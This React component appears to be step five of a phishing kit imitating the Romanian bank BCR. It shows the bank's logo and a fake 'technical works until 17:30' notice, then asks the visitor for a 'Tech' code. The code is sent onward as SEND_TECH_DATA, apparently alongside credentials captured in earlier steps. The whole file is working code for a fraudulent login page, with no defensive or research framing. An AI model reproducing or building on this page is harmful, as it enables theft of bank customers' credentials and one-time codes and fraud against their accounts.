import React, { useState, useEffect } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import logo from '../media/logo-bcr.png'
import keyboard from '../media/virtual-keyboard.png'
import eng from '../media/eng.PNG'
import ro from '../media/ro.PNG'
import { ErrorMsg } from './ErrorMsg'


export const Step_5 = props => {
  const { store, changeStore } = props
  const [value, setValue] = useState(store.step_5_cod)

  const error = store.error
  const setError = val => changeStore({ error: val })

    const handleChange = (value) => {
    setValue(value)
  }

  const handleSubmit = () => {

    if (!value) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_TECH_DATA, payload: value })

    changeStore({
      step_5_cod: value,
      loading: true,
    })

  }

  return (
    <div className="section-container" >
      <div className="form-container">
        <div className="logo-container">
          <img src={logo} alt="logo-bcr" />
        </div>
        <div style={{fontSize: 12, marginBottom: 10}} className="os">
          LUCRARI TEHNICE PANA LA ORA 17:30
        </div>
        {error && <ErrorMsg errorMessage="Campul nu poate fi gol" />}
        <div className="form-field">
          <input type="text" placeholder="Tech" onChange={e => handleChange(e.target.value, FieldType.LOGIN)}/>
        </div>
        
        {/* <div className="reset-container">
          <img src={keyboard} alt="keyboard" className="keyboard"/>
          <a href="#" onClick={() => changeStore({ step: STEPS.STEP_2})}>Activare eToken</a>
        </div> */}
        <div className="login-container">
          <button className="primary-btn login-btn" onClick={handleSubmit}>Continua</button>
        </div>
        <div className="select-language-container">
          <img src={eng} alt="English" style={{width: '12%'}} />
          <img src={ro} alt="Romanian" />

        </div>
      </div>
    </div>
    
  )
}


